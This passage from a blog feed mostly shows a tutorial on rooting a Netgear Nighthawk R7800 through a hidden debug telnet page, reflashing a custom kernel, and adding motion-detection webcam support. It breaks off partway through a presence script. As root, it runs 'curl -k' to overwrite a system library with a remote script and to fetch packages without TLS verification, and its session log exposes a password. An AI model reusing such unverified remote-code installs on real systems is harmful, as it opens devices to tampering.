&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;QEMU is able to run Exynos 4210 BootROM with &lt;strong&gt;&lt;em&gt;relatively&lt;/em&gt;&lt;/strong&gt; &lt;a href="https://github.com/frederic/qemu-exynos-bootrom"&gt;small code changes&lt;/a&gt; (~600 LoC). This project allows to debug BootROM dynamically with GDB. It has been helpful for analyzing secure boot mechanism that loads and authenticates the next stage from flash memory.&lt;/p&gt;</content><category term="arm"></category><category term="exynos"></category><category term="samsung"></category><category term="bootrom"></category><category term="qemu"></category><category term="emulation"></category><category term="bootloader"></category><category term="secureboot"></category></entry><entry><title>Netgear Nighthawk R7800 : add USB camera support to create a security webcam</title><link href="https://fredericb.info/2017/11/netgear-nighthawk-r7800-add-usb-camera-support-to-create-a-security-webcam.html" rel="alternate"></link><published>2017-11-22T00:00:00-08:00</published><updated>2017-11-22T00:00:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2017-11-22:/2017/11/netgear-nighthawk-r7800-add-usb-camera-support-to-create-a-security-webcam.html</id><summary type="html">&lt;p&gt;This article explains how to customize Nighthawk X4S firmware to add a security camera feature to this always-online &amp;amp; almost-always-idle device.
Alternative firmwares like &lt;a href="https://openwrt.org/"&gt;OpenWRT&lt;/a&gt; or &lt;a href="https://lede-project.org/"&gt;LEDE&lt;/a&gt; exist, but they don't fully support all stock features yet. So instead this approach is based on modified stock firmware.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Netgear Nighthawk X4S" src="https://fredericb.info/blog/r7800-custom/x4s.jpg"&gt;
&lt;img alt="Serious webcam" src="https://fredericb.info/blog/r7800-custom/webcam.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Main steps are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Customize …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;This article explains how to customize Nighthawk X4S firmware to add a security camera feature to this always-online &amp;amp; almost-always-idle device.
Alternative firmwares like &lt;a href="https://openwrt.org/"&gt;OpenWRT&lt;/a&gt; or &lt;a href="https://lede-project.org/"&gt;LEDE&lt;/a&gt; exist, but they don't fully support all stock features yet. So instead this approach is based on modified stock firmware.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Netgear Nighthawk X4S" src="https://fredericb.info/blog/r7800-custom/x4s.jpg"&gt;
&lt;img alt="Serious webcam" src="https://fredericb.info/blog/r7800-custom/webcam.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Main steps are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Customize kernel to add USB video support (uvc, v4l2)&lt;/li&gt;
&lt;li&gt;Install additional software packages for motion detection&lt;/li&gt;
&lt;li&gt;Configure motion detection alerts&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;#YOLO&lt;/h1&gt;
&lt;p&gt;There's always a risk of bricking the device if something goes wrong. However, a &lt;a href="https://kb.netgear.com/22688/How-to-upload-firmware-to-a-NETGEAR-router-using-TFTP"&gt;recovery procedure via TFTP&lt;/a&gt; exists.&lt;/p&gt;
&lt;p&gt;Software downloads are performed over HTTP, due to client limitation on target side.&lt;/p&gt;
&lt;h1&gt;Hardware&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.netgear.com/home/products/networking/wifi-routers/R7800.aspx"&gt;Neatgear Nighthawk X4S router&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.aliexpress.com/item/Newest-Webcam-USB-12-Megapixel-High-Definition-Camera-Web-Cam-360-Degree-MIC-Clip-on-For/32659656232.html"&gt;random cheap USB webcam&lt;/a&gt; (don't buy that one, quality is terrible)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Root that firmware&lt;/h1&gt;
&lt;p&gt;I first thought that this step would be a pain, but then reminded the device manufacturer name. By grepping 'telnet' in the &lt;a href="https://www.netgear.com/support/product/r7800.aspx#download"&gt;firmware binary&lt;/a&gt;, we discover the existence of a debug page &lt;em&gt;/debug.htm&lt;/em&gt; , with telnet option:&lt;/p&gt;
&lt;p&gt;&lt;img alt="R7800 debug webpage" src="https://fredericb.info/blog/r7800-custom/r7800_debug_page.png" width="852px"&gt;&lt;/p&gt;
&lt;p&gt;Telnet access is protected with the same password as WebUI, and gives a root shell.&lt;/p&gt;
&lt;h1&gt;Backup all the things&lt;/h1&gt;
&lt;p&gt;Thanks to telnet access, we backup the original kernel partition on an external USB drive :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ telnet &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1
Trying &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1...
Connected to &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1.
Escape character is &lt;span class="s1"&gt;&amp;#39;^]&amp;#39;&lt;/span&gt;.
 &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="nv"&gt;LOGIN&lt;/span&gt; &lt;span class="o"&gt;===============================&lt;/span&gt;
  Please enter your password,It&lt;span class="s1"&gt;&amp;#39;s the same&lt;/span&gt;
&lt;span class="s1"&gt;  with DUT login password&lt;/span&gt;
&lt;span class="s1"&gt; ------------------------------------------&lt;/span&gt;
&lt;span class="s1"&gt;telnet password:JCVD4l1FE&lt;/span&gt;
&lt;span class="s1"&gt;=== IMPORTANT ============================&lt;/span&gt;
&lt;span class="s1"&gt; Use &amp;#39;&lt;/span&gt;passwd&lt;span class="s1"&gt;&amp;#39; to set your login password&lt;/span&gt;
&lt;span class="s1"&gt; this will disable telnet and enable SSH&lt;/span&gt;
&lt;span class="s1"&gt;------------------------------------------&lt;/span&gt;


&lt;span class="s1"&gt;BusyBox v1.4.2 (2017-08-29 13:01:25 CST) Built-in shell (ash)&lt;/span&gt;
&lt;span class="s1"&gt;Enter &amp;#39;&lt;/span&gt;help&lt;span class="s1"&gt;&amp;#39; for a list of built-in commands.&lt;/span&gt;

&lt;span class="s1"&gt;     MM           NM                    MMMMMMM          M       M&lt;/span&gt;
&lt;span class="s1"&gt;   $MMMMM        MMMMM                MMMMMMMMMMM      MMM     MMM&lt;/span&gt;
&lt;span class="s1"&gt;  MMMMMMMM     MM MMMMM.              MMMMM:MMMMMM:   MMMM   MMMMM&lt;/span&gt;
&lt;span class="s1"&gt;MMMM= MMMMMM  MMM   MMMM       MMMMM   MMMM  MMMMMM   MMMM  MMMMM&amp;#39;&lt;/span&gt;
&lt;span class="nv"&gt;MMMM&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;  MMMMM MMMM    MM       MMMMM    MMMM    MMMM   MMMMNMMMMM
&lt;span class="nv"&gt;MMMM&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;   MMMM  MMMMM          MMMMM     MMMM    MMMM   MMMMMMMM
&lt;span class="nv"&gt;MMMM&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;   MMMM   MMMMMM       MMMMM      MMMM    MMMM   MMMMMMMMM
&lt;span class="nv"&gt;MMMM&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;   MMMM     MMMMM,    NMMMMMMMM   MMMM    MMMM   MMMMMMMMMMM
&lt;span class="nv"&gt;MMMM&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;   MMMM      MMMMMM   MMMMMMMM    MMMM    MMMM   MMMM  MMMMMM
&lt;span class="nv"&gt;MMMM&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;   MMMM   MM    MMMM    MMMM      MMMM    MMMM   MMMM    MMMM
MMMM$ ,MMMMM  MMMMM  MMMM    MMM       MMMM   MMMMM   MMMM    MMMM
  MMMMMMM:      MMMMMMM     M         MMMMMMMMMMMM  MMMMMMM MMMMMMM
    MMMMMM       MMMMN     M           MMMMMMMMM      MMMM    MMMM
     MMMM          M                    MMMMMMM        M       M
       M
 ---------------------------------------------------------------
   For those about to rock... &lt;span class="o"&gt;(&lt;/span&gt;%C, %R&lt;span class="o"&gt;)&lt;/span&gt;
 ---------------------------------------------------------------
root@R7800:/# cat /proc/mtd &lt;span class="p"&gt;|&lt;/span&gt; grep kernel
mtd5: &lt;span class="m"&gt;00220000&lt;/span&gt; &lt;span class="m"&gt;00020000&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;kernel&amp;quot;&lt;/span&gt;

root@R7800:/# dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/mtdblock5 &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/mnt/sda1/kernel.img
&lt;span class="m"&gt;4352&lt;/span&gt;+0 records in
&lt;span class="m"&gt;4352&lt;/span&gt;+0 records out
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Kernel&lt;/h1&gt;
&lt;p&gt;Netgear has released &lt;a href="https://github.com/frederic/netgear-R7800-GPL"&gt;GPL source code&lt;/a&gt; for the Linux kernel used in this device. 
This copy on GitHub integrates few fixes to compile with newer GCC and V4L2 headers, and also the original kernel configuration dumped from live device.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git clone https://github.com/frederic/netgear-R7800-GPL.git
$ &lt;span class="nb"&gt;cd&lt;/span&gt; netgear-R7800-GPL/
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Build mkimage tool&lt;/h2&gt;
&lt;p&gt;The &lt;em&gt;mkimage&lt;/em&gt; tool is used at the end of kernel building process to create the new kernel image partition for the device.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ make tools/mkimage/install
 make&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; tools/mkimage/install
 make&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; -C tools/sed compile
 make&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; -C tools/sed install
 make&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; -C tools/mkimage compile
 make&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; -C tools/mkimage install
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Add freshly built &lt;em&gt;mkimage&lt;/em&gt; binary to our PATH environment:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$PWD&lt;/span&gt;/build_dir/host/u-boot-2012.04.01/tools:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Build Linux kernel&lt;/h2&gt;
&lt;p&gt;To build a kernel for this ARM-based device, we need to add a cross-compilation toolchain to our build environment :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-eabi-4.8
$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$PWD&lt;/span&gt;/arm-eabi-4.8/bin:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then we create a new kernel configuration based on the original one :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; git_home/linux.git/sourcecode/
$ make r7800_defconfig &lt;span class="nv"&gt;ARCH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;arm &lt;span class="nv"&gt;CROSS_COMPILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;arm-eabi-
$ make menuconfig &lt;span class="nv"&gt;ARCH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;arm &lt;span class="nv"&gt;CROSS_COMPILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;arm-eabi-
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In the kernel configuration menu, we enable the following options to get V4L2 &amp;amp; USB Video support :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Device Drivers ---&amp;gt;
-&amp;gt; &amp;lt;*&amp;gt; Multimedia support ---&amp;gt;
--&amp;gt; &amp;lt;*&amp;gt; Video For Linux
--&amp;gt; &amp;lt;*&amp;gt; Video capture adapters ---&amp;gt;
---&amp;gt; &amp;lt;*&amp;gt; V4L USB devices ---&amp;gt;
----&amp;gt; &amp;lt;*&amp;gt; USB Video Class (UVC)
----&amp;gt; &amp;lt;*&amp;gt; GSPCA based webcams
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For info, that should correspond to these options :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;CONFIG_USB_VIDEO_CLASS=y
CONFIG_USB_GSPCA=y
CONFIG_VIDEO_V4L2_COMMON=y
CONFIG_VIDEO_V4L2=y
CONFIG_V4L_USB_DRIVERS=y
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finally, we build the kernel image :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ make -j8 uImage &lt;span class="nv"&gt;ARCH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;arm &lt;span class="nv"&gt;CROSS_COMPILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;arm-eabi-
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
  Kernel: arch/arm/boot/Image is ready
  Kernel: arch/arm/boot/zImage is ready
  UIMAGE  arch/arm/boot/uImage
Image Name:   Linux-3.4.103
Created:      Mon Jan &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;23&lt;/span&gt;:58:38 &lt;span class="m"&gt;2018&lt;/span&gt;
Image Type:   ARM Linux Kernel Image &lt;span class="o"&gt;(&lt;/span&gt;uncompressed&lt;span class="o"&gt;)&lt;/span&gt;
Data Size:    &lt;span class="m"&gt;2210952&lt;/span&gt; &lt;span class="nv"&gt;Bytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2159&lt;/span&gt;.13 &lt;span class="nv"&gt;kB&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;.11 MB
Load Address: &lt;span class="m"&gt;41508000&lt;/span&gt;
Entry Point:  &lt;span class="m"&gt;41508000&lt;/span&gt;
  Image arch/arm/boot/uImage is ready
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Output kernel image is &lt;strong&gt;arch/arm/boot/uImage&lt;/strong&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ file arch/arm/boot/uImage
arch/arm/boot/uImage: u-boot legacy uImage, Linux-3.4.103, Linux/ARM, OS Kernel Image &lt;span class="o"&gt;(&lt;/span&gt;Not compressed&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="m"&gt;2210952&lt;/span&gt; bytes, Tue Jan &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;07&lt;/span&gt;:58:38 &lt;span class="m"&gt;2018&lt;/span&gt;, Load Address: 0x41508000, Entry Point: 0x41508000, Header CRC: 0x81013485, Data CRC: 0xDEA9B00E
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In current firmware, kernel partition size is 2228224 bytes. So the new kernel image cannot be larger.&lt;/p&gt;
&lt;p&gt;We copy that image to a USB drive and then, &lt;strong&gt;from the telnet shell&lt;/strong&gt;, we overwrite original kernel with the new image :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@R7800:/# dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/mnt/sda1/uImage &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/mtdblock5
root@R7800:/# sync
root@R7800:/# reboot
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;em&gt;Note: You have to enable telnet in WebUI after each reboot.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Now the router detects USB camera when plugged in :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;usb 3-1: new high-speed USB device number 5 using xhci-hcd
usb 3-1: New USB device found, idVendor=1908, idProduct=2310
usb 3-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3
usb 3-1: Product: USB2.0 PC CAMERA
usb 3-1: Manufacturer: Generic
usb 3-1: SerialNumber: 20100331010203
INFO008C: Add device intf d39cc400, dev d39a5000
INFO0C15:  filter audio device
uvcvideo: Found UVC 1.00 device USB2.0 PC CAMERA (1908:2310)
input: USB2.0 PC CAMERA as /devices/platform/ipq-dwc3.1/dwc3.1/xhci-hcd.1/usb3/3-1/3-1:1.0/input/input3
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Install software packages&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;"&lt;a href="https://motion-project.github.io/"&gt;Motion&lt;/a&gt; is a program that monitors the video signal from cameras. It is able to detect if a significant part of the picture has changed; in other words, it can detect motion."&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Fortunately, this package is available in OpenWrt repositories for our architecture.
And stock firmware includes the OpenWrt package manager &lt;strong&gt;opkg&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;However, &lt;strong&gt;opkg&lt;/strong&gt; is outdated and needs to be &lt;a href="https://gist.github.com/frederic/fcb7ddc14c46aa630143aaeafe2d706f"&gt;patched&lt;/a&gt; first :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@R7800:/# curl -k https://gist.githubusercontent.com/frederic/fcb7ddc14c46aa630143aaeafe2d706f/raw/8242c18a514f19b58c74387d4bfa0e5511bbb4e5/functions.sh -o &lt;span class="s1"&gt;&amp;#39;/lib/functions.sh&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then, we can install &lt;em&gt;motion&lt;/em&gt; &amp;amp; &lt;em&gt;libjpeg&lt;/em&gt; packages :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@R7800:~# curl -k https://raw.githubusercontent.com/frederic/netgear-R7800-GPL/master/ipk/libjpeg_9a-1_ipq806x.ipk -o /tmp/libjpeg_9a-1_ipq806x.ipk
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
&lt;span class="m"&gt;100&lt;/span&gt; &lt;span class="m"&gt;92994&lt;/span&gt;  &lt;span class="m"&gt;100&lt;/span&gt; &lt;span class="m"&gt;92994&lt;/span&gt;    &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;   259k      &lt;span class="m"&gt;0&lt;/span&gt; --:--:-- --:--:-- --:--:--  430k
root@R7800:~# opkg install /tmp/libjpeg_9a-1_ipq806x.ipk 
Installing libjpeg &lt;span class="o"&gt;(&lt;/span&gt;9a-1&lt;span class="o"&gt;)&lt;/span&gt; to root...
Configuring libjpeg.


root@R7800:~# curl -k https://raw.githubusercontent.com/frederic/netgear-R7800-GPL/master/ipk/motion_3.4.0-20141018-9479d910f2149b5558788bb86f97f26522794212-1_ipq806x.ipk -o /tmp/motion_3.4.0-20141018-9479d910f2149b5558788bb86f97f26522794212-1_ipq806x.ipk
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
&lt;span class="m"&gt;100&lt;/span&gt; &lt;span class="m"&gt;94802&lt;/span&gt;  &lt;span class="m"&gt;100&lt;/span&gt; &lt;span class="m"&gt;94802&lt;/span&gt;    &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;   297k      &lt;span class="m"&gt;0&lt;/span&gt; --:--:-- --:--:-- --:--:--  387k
root@R7800:~# opkg install /tmp/motion_3.4.0-20141018-9479d910f2149b5558788bb86f97f26522794212-1_ipq806x.ipk
Installing motion &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.4.0-20141018-9479d910f2149b5558788bb86f97f26522794212-1&lt;span class="o"&gt;)&lt;/span&gt; to root...
Configuring motion.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note that motion software expects its default configuration file at different path than the one actually provided. So we move it back to default path :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@R7800:/# mkdir /etc/motion
root@R7800:/# mv /overlay/etc/motion.conf /etc/motion/motion.conf
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Configuration&lt;/h1&gt;
&lt;p&gt;To enable motion detection only when our smartphone (hence we) is not at home, we call our custom script in Hostapd script &lt;strong&gt;/lib/wifi/wps-hostapd-update-uci&lt;/strong&gt;.
It will only be triggered when a station connects or disconnects from the router.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gh"&gt;diff --git a/lib/wifi/wps-hostapd-update-uci b/lib/wifi/wps-hostapd-update-uci&lt;/span&gt;
&lt;span class="gh"&gt;index f60abe3..dd6f3f2 100755&lt;/span&gt;
&lt;span class="gd"&gt;--- a/lib/wifi/wps-hostapd-update-uci&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/lib/wifi/wps-hostapd-update-uci&lt;/span&gt;
&lt;span class="gu"&gt;@@ -157,6 +157,9 @@ check_ap_lock_down()&lt;/span&gt;
 }

 case &amp;quot;$CMD&amp;quot; in
&lt;span class="gi"&gt;+        AP-STA-CONNECTED|AP-STA-DISCONNECTED)&lt;/span&gt;
&lt;span class="gi"&gt;+                /etc/motion_cron.sh $CMD $3&lt;/span&gt;
&lt;span class="gi"&gt;+        ;;&lt;/span&gt;
        WPS-NEW-AP-SETTINGS|WPS-NEW-AP-SETTINGS-AP-PIN)
                local ssid=$(hostapd_cli -i$IFNAME -p/var/run/hostapd-$parent get_config | grep ^ssid= | cut -f2- -d =)
                local wpa=$(hostapd_cli -i$IFNAME -p/var/run/hostapd-$parent get_config | grep ^wpa= | cut -f2- -d=)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We create the following script in &lt;strong&gt;/etc/motion_cron.sh&lt;/strong&gt; :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/bin/sh&lt;/span&gt;
&lt;span class="c1"&gt;# Start or stop motion service depending on wifi client status&lt;/span&gt;
&lt;span class="c1"&gt;# Usage: motion_cron.sh [&amp;lt;event_type&amp;gt; &amp;lt;mac addr&amp;gt;]&lt;/span&gt;

&lt;span class="nv"&gt;HWADDR&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;00&lt;/span&gt;:11:22:33:44:55 &lt;span class="c1"&gt;# Update with your smartphone MAC address&lt;/span&gt;

&lt;span class="nv"&gt;CONNECTED&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="nv"&gt;CMD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;motion
&lt;span class="nv"&gt;CMD_PID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/var/run/&lt;span class="nv"&gt;$CMD&lt;/span&gt;.pid
&lt;span class="nv"&gt;CMD_BIN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/&lt;span class="nv"&gt;$CMD&lt;/span&gt;
&lt;span class="nv"&gt;PID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;pidof &lt;span class="nv"&gt;$CMD&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="nv"&gt;$#&lt;/span&gt; -eq &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
 &lt;span class="nv"&gt;EVENT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;
 &lt;span class="nv"&gt;EVENT_MAC&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$2&lt;/span&gt;
 &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$EVENT_MAC&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$HWADDR&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
  &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$EVENT&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; in
    AP-STA-DISCONNECTED&lt;span class="o"&gt;)&lt;/span&gt;
      &lt;span class="nv"&gt;CONNECTED&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
      &lt;span class="p"&gt;;;&lt;/span&gt;
    AP-STA-CONNECTED&lt;span class="o"&gt;)&lt;/span&gt;
      &lt;span class="nv"&gt;CONNECTED&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
      &lt;span class="p"&gt;;;&lt;/span&gt;
    *&lt;span class="o"&gt;)&lt;/span&gt;
      &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Non-interesting event, ignore...&amp;quot;&lt;/span&gt;
      &lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
  &lt;span class="k"&gt;esac&lt;/span&gt;
  &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$EVENT&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$EVENT_MAC&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
 &lt;span class="k"&gt;else&lt;/span&gt;
  &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Not our MAC, ignore...&amp;quot;&lt;/span&gt;
  &lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
 &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="k"&gt;else&lt;/span&gt;
 &lt;span class="k"&gt;if&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;0x2\W\+&lt;/span&gt;&lt;span class="nv"&gt;$HWADDR&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; /proc/net/arp &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
  &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$HWADDR&lt;/span&gt;&lt;span class="s2"&gt; is connected in arp table&amp;quot;&lt;/span&gt;
  &lt;span class="nv"&gt;CONNECTED&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
 &lt;span class="k"&gt;else&lt;/span&gt;
  &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$HWADDR&lt;/span&gt;&lt;span class="s2"&gt; is disconnected in arp table&amp;quot;&lt;/span&gt;
  &lt;span class="nv"&gt;CONNECTED&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
 &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="k"&gt;fi&lt;/span&gt;

